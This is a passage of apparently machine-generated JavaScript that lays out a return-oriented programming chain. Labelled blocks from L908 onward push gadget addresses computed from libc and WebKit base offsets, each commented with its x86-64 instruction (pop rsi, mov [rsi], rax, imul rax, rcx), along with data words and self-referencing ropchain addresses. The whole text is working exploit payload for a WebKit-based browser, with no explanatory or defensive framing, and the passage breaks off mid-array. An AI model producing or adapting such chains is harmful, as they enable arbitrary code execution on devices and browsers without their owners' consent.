//L908:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1084336, //L910
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L910:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1084392, //L911
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L911:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1084472, //L913
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L913:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L914:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L915:
db([15, 0]); // 0xf
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1084584, //L916
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1084600, //L917
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L916:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L917:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1084688, //L919
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L919:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1084744, //L920
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L920:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1084816, //L923
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L923:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1084872, //L924
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L924:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L926:
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1085024, //L928
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L927:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L928:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1085112, //L930
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1085128, //L931
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L930:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L931:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1085272, //L935
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1085240, //L933
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1085256, //L934
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L933:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L934:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L935:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1085344, //L937
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L937:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1085400, //L938
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L938:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1085480, //L940
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L940:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L941:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L942:
db([16, 0]); // 0x10
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1085592, //L943
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1085608, //L944
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L943:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L944:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1085696, //L946
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L946:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1085752, //L947
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L947:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1085824, //L950
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L950:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1085880, //L951
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L951:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L953:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1086032, //L955
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L954:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L955:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1086120, //L957
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1086136, //L958
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L957:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L958:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1086280, //L962
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1086248, //L960
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1086264, //L961
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L960:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L961:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L962:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1086352, //L964
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L964:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1086408, //L965
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L965:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1086488, //L967
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L967:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L968:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L969:
db([17, 0]); // 0x11
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1086600, //L970
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1086616, //L971
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L970:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L971:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1086704, //L973
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L973:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1086760, //L974
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L974:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1086832, //L977
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L977:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1086888, //L978
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L978:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L980:
libc_base+764760, //pop rsi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1087040, //L982
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L981:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L982:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1087128, //L984
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1087144, //L985
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L984:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L985:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1087288, //L989
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1087256, //L987
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1087272, //L988
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L987:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L988:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L989:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1087360, //L991
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L991:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1087416, //L992
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L992:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1087496, //L994
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L994:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L995:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L996:
db([18, 0]); // 0x12
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1087608, //L997
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1087624, //L998
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L997:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L998:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1087712, //L1000
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1000:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1087768, //L1001
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1001:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1087840, //L1004
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1004:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1087896, //L1005
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1005:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1088000, //L1008
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1007:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L1008:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1088088, //L1010
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1088104, //L1011
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1010:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1011:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1088248, //L1015
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1088216, //L1013
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1088232, //L1014
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1013:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1014:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1015:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1088320, //L1017
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1017:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1088376, //L1018
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1018:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1088456, //L1020
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1020:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1021:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1022:
db([3, 0]); // 0x3
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1088568, //L1023
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1088584, //L1024
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1023:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1024:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1088672, //L1026
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1026:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1088728, //L1027
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1027:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1088848, //L1030
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1029:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1030:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1088936, //L1032
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1088952, //L1033
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1032:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1033:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1089096, //L1037
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1089064, //L1035
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1089080, //L1036
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1035:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1036:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1037:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1089168, //L1039
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1039:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1089224, //L1040
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1040:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1089304, //L1042
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1042:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1043:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1044:
db([19, 0]); // 0x13
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1089416, //L1045
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1089432, //L1046
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1045:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1046:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1089520, //L1048
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1048:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1089576, //L1049
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1049:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1089648, //L1052
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1052:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1089704, //L1053
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1053:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L1055:
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1089856, //L1057
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1056:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1057:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1089944, //L1059
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1089960, //L1060
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1059:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1060:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1090104, //L1064
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1090072, //L1062
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1090088, //L1063
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1062:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1063:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1064:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
